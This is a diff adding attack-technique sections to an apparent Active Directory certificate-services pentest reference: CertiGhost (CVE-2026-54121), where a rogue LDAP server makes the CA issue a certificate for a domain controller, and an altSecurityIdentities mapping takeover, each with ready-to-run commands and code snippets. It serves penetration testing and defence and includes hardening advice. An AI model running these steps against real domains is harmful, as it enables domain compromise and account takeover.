@@ -333,8 +333,149 @@ If we are an attacker with `GenericWrite` permissions over the `victim` account,
         -username 'administrator' -domain '<DOMAIN>'
     ```
 
+### CertiGhost (CVE-2026-54121)
+
+Every ESC above is a *misconfiguration*: a template that lets the enrollee choose the subject, a CA that honours request SANs, a DACL that should not be there. CertiGhost is not. It works against a **default `Machine` template on a correctly configured CA**, and the defect is in how the CA resolves the requester's identity.
+
+#### The `cdc` chase
+
+When a template builds its subject from the directory rather than from the request (the `SubjectAltRequireDns` / `SubjectRequireDnsAsCn` name flags, `nameFlag & 0x58000000`), the CA cannot take the name from the CSR. It has to ask a Domain Controller "who is this requester, and what is its `dNSHostName`?", then stamp the answer into the certificate.
+
+MS-WCCE lets the client attach request attributes alongside the CSR. Four are relevant:
+
+| Attribute | Meaning |
+|---|---|
+| `CertificateTemplate` | Which template to issue from |
+| `cdc` | Which DC the CA should use for the lookup |
+| `rmd` | The requester machine's DNS name |
+| `SAN` | Requested subject alternative name |
+
+**The vulnerability is that the CA honours a caller-supplied `cdc`.** Point it at a host you control and the CA performs its identity lookup against your LDAP server instead of against a real Domain Controller. The directory answer is the certificate's identity, so whoever answers decides who the certificate belongs to.
+
+#### Attack flow
+
+1. Authenticate to the CA's `ICertPassage` RPC interface (`\pipe\cert`, falling back to `ncacn_ip_tcp` via the endpoint mapper) as a **computer account**.
+2. Stand up two rogue listeners on the attacking host: an SMB/LSA server on **445** and an LDAP server on **389**.
+3. Submit the CSR with `cdc:<attacker-ip>` and `rmd:<target DC DNS name>`.
+4. The CA connects back to those listeners. The rogue SMB server validates the CA's inbound authentication by passing it through to the *real* DC over Netlogon, so from the CA's point of view the session is genuinely authenticated. The rogue LDAP server then answers the identity lookup with the **target DC's** `sAMAccountName`, `objectSid` and `dNSHostName` instead of the requester's.
+5. The CA builds and signs a certificate for `DC01$`.
+6. PKINIT with that certificate returns `DC01$`'s TGT and NT hash, which is a DCSync.
+
+The substitution is a handful of lines in the rogue LDAP handler, which returns the target's identity for whatever principal the CA asks about:
+
+```python
+def _principal(self, sam):
+    return {"objectClass":["top","person","organizationalPerson","user","computer"],
+            "cn":[self.ecn or sam.rstrip("$")], "sAMAccountName":[self.esam or sam],
+            "objectSid":[self.tsid], "objectGUID":[b"\x00"*16], "userAccountControl":["66048"],
+            "objectCategory":[f"CN=Computer,CN=Schema,CN=Configuration,{self.dn}"],
+            "dNSHostName":[self.edns],
+            "servicePrincipalName":[f"HOST/{self.edns}", f"HOST/{self.ecn or self._hnb}"]}
+```
+
+#### Requirements
+
+- **Any computer account.** The requester must be a machine account, because the `Machine` template's enrollment rights are granted to `Domain Computers`.
+- **Ports 445 and 389 free on the attacking host**, since the CA connects back to them. A local Samba or `slapd` already bound will make the callback fail and the request will be denied with a generic `0x800706ba`.
+- **A template whose name flags trigger the lookup.** `Machine` is the default choice; templates that do not build the subject from AD never perform the chase.
+
+#### Getting a computer account when `MachineAccountQuota` is 0
+
+The PoC creates a throwaway `GHOSTxxxxxxxx$` by default, which needs a non-zero quota. `MachineAccountQuota: 0` does not close the attack, it only means you must bring your own machine identity:
+
+```bash
+# an existing computer account you already control, by password or NT hash
+sudo python3 certighost.py -d '<DOMAIN>' --computer-name 'WS01$' --computer-hash ':<nthash>'
+```
+
+```bash
+# or a gMSA you can read: no secret needed, the tool derives the hash from
+# msDS-ManagedPassword itself
+sudo python3 certighost.py -d '<DOMAIN>' -u '<user>' -p '<pass>' --gmsa 'SVC_SQL$'
+```
+
+Root on any domain-joined host is a machine account (`/etc/krb5.keytab` on Linux, LSA secrets on Windows), and a [gMSA](/theory/windows/AD/gmsa/) sits in `Domain Computers` by default, so the read right on one is enough.
+
+> This is the general lesson about `MachineAccountQuota: 0`. It is a good hardening default and it genuinely closes `Certifried` (CVE-2022-26923), `sAMAccountName` spoofing, and RBCD from a fresh account. It does nothing once you already hold *any* machine account's secret. Treat it as raising the cost of a class of attacks, never as removing the class.
+{: .prompt-info}
+
+#### Why no template hardening helps
+
+Nothing in this chain is an enrollee-supplied subject, an `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, or a loose template DACL. The CA does exactly what it was designed to do; it simply asked an attacker-controlled directory who the requester was and believed the answer. The fix is the patch. Compensating controls are limited to network position (the CA should not be making outbound LDAP/SMB connections to arbitrary hosts) and to monitoring certificate issuance for DC identities that nobody requested.
+
+## Certificate Mapping and `altSecurityIdentities`
+
+When a client authenticates with a certificate (PKINIT, or LDAPS/Schannel client auth), the KDC has to decide which account that certificate represents. There are two mechanisms.
+
+**Implicit mapping** reads the identity out of the certificate itself, normally a UPN in the Subject Alternative Name, or the `szOID_NTDS_CA_SECURITY_EXT` SID security extension that modern CAs stamp into every issued certificate.
+
+**Explicit mapping** ignores the certificate's own claim about who it belongs to and looks for an account whose multi-valued `altSecurityIdentities` attribute contains a string describing that certificate. This is the supported way to bind an externally issued certificate (a smartcard from a partner PKI, for example) to a domain account.
+
+### Strong and weak mapping types
+
+`KB5014754` split the explicit mapping strings into **strong** and **weak** forms, and Full Enforcement mode rejects the weak ones. The difference is whether the string pins something the CA cannot re-issue under a different key:
+
+| Mapping string | Pins | Strength |
+|---|---|---|
+| `X509IssuerSerialNumber` | Issuer DN plus certificate serial | Strong |
+| `X509SKI` | Subject Key Identifier | Strong |
+| `X509SHA1PublicKey` | SHA1 of the public key | Strong |
+| `X509IssuerSubject` | Issuer DN plus subject DN | Weak |
+| `X509SubjectOnly` | Subject DN | Weak |
+| `X509RFC822` | RFC822 name (email address) | Weak |
+
+### Abusing a write on `altSecurityIdentities`
+
+Any principal holding `WriteProperty` on `altSecurityIdentities` (directly, or through `GenericAll` / `GenericWrite`) can declare that an arbitrary certificate belongs to the target account. Combined with **any** certificate the attacker can legitimately obtain from the enterprise CA, this is a full account takeover, and it works even against templates that are not vulnerable to any ESC: the certificate never needs to name the victim, because the directory does that instead.
+
+The attack does not touch the password, does not change group membership, and produces no password-reset event. The mapping simply sits in the attribute until somebody audits it.
+
+**Exploitation with the `X509IssuerSerialNumber` form:**
+
+1. **Obtain any client-authentication certificate.** It can be a certificate for the attacker's own account from a completely benign template.
+
+    ```bash
+    certipy req -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
+        -target 'CA.<DOMAIN>' -ca 'CORP-CA' -template 'User'
+    ```
+
+2. **Read the issuer and serial number off it.**
+
+    ```bash
+    certipy cert -pfx attacker.pfx -out attacker.crt
+    openssl x509 -in attacker.crt -noout -issuer -serial
+    ```
+
+3. **Build the mapping string.** The format is `X509:<I>{issuer}<SR>{serial}`. The serial has to be written in **reverse byte order** relative to how `openssl` prints it, matching `certutil`'s rendering:
+
+    ```python
+    issuer = "DC=local,DC=corp,CN=CORP-CA"
+    serial = "".join("4d:00:00:00:3d:da:7a:59".split(":")[::-1])
+    print("X509:<I>" + issuer + "<SR>" + serial)
+    ```
+
+4. **Write it onto the victim.**
+
+    ```bash
+    bloodyAD -u 'attacker' -p 'Passw0rd!' -d '<DOMAIN>' --host '<DC>' \
+        set object victim altSecurityIdentities \
+        -v 'X509:<I>DC=local,DC=corp,CN=CORP-CA<SR><reversed-serial>' --raw
+    ```
+
+5. **Authenticate as the victim with the attacker's certificate.** Certipy will report that it cannot find an identity inside the certificate, which is expected: the identity comes from the directory.
+
+    ```bash
+    certipy auth -pfx attacker.pfx -dc-ip '<DC-IP>' -username 'victim' -domain '<DOMAIN>'
+    ```
+
+> Audit `altSecurityIdentities` the way you audit group membership. A single string in one attribute is equivalent to handing out the account's credentials, it survives password rotation, and no standard "who can reset whose password" report will surface it.
+{: .prompt-danger}
+
 ## References
 
 - [Hack the Box - ADCS](https://www.academy.hackthebox.com)
+- [KB5014754 - Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
+- [MSRC - CVE-2026-54121](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-54121)
+- [CertiGhost - analysis and PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
 - [Certified Pre-Owned SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 - [Certipy - Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
